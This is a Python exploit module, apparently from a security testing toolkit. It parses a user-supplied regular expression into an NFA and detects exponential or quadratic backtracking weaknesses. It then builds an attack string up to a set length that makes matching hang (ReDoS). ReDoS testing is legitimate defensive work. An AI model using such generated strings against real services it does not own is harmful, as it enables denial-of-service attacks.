from .redos_detector.nfagraphviz import NFAGraphViz
from .redos_detector.regex_parser import RegexParser
from .redos_detector.redos_detector import find_hyper_vulnerabilities, find_quadratic_vulnerabilities
from options import Options


options = Options()
options.add_option('regex', 'your_regex', 'Regex to exploit, if vulnerable')
options.add_option('max_length', 25, 'Maximum size of exploit string, if regex is vulnerable')
options.add_option('show_nfa', False, 'Whether to show the parsed NFA graph (for debugging)')

DESCRIPTION = 'Exploits regex that are vulnerable to catastrophic backtracking (ReDoS).' \
              '\n\n  ' \
              'Given a regex, it is first checked to see if it is vulnerable to ReDoS attack. There are two checks: ' \
              'if it is vulnerable to an exponential attack, or a quadratic attack. Exponential attacks have a much ' \
              'more significant effect with a shorter string length, whereas a quadratic attack likely needs a larger ' \
              'string length to have an effect. Once it is determined that a regex is vulnerable, a string is output ' \
              'that when matched against the regex, will result in a large amount of resources needed to determine if ' \
              'the string matches (and will likely never finish). The larger the exploit string length, the longer this ' \
              'will take. Algorithms used are from "Static Detection of DoS Vulnerabilities in Programs that use Regular ' \
              'Expressions", by Wustholz, Olivo, Heule, and Dillig.'
NO_INPUT = True
DEFAULT_OUTPUT = 'stdout'


def run(output):
    parser = RegexParser()
    nfa = parser.run(options['regex'])

    if options['show_nfa']:
        # TODO - we don't want to print anything in exploit modules. Perhaps just show graph?
        #pprint.pprint(nfa)
        NFAGraphViz(nfa).show_graph()

    vulnerable_pattern = find_hyper_vulnerabilities(nfa)
    if vulnerable_pattern is None:
        vulnerable_pattern = find_quadratic_vulnerabilities(nfa)
    if vulnerable_pattern is None:
        raise ValueError('Regex is not vulnerable to ReDoS attack')

    prefix, attack = vulnerable_pattern
    if len(prefix) + len(attack) > options['max_length']:
        raise ValueError('Max length too small, cannot exploit regex')

    exploit_string = prefix
    while len(exploit_string) + len(attack) <= options['max_length']:
        exploit_string += attack

    output.output([exploit_string])
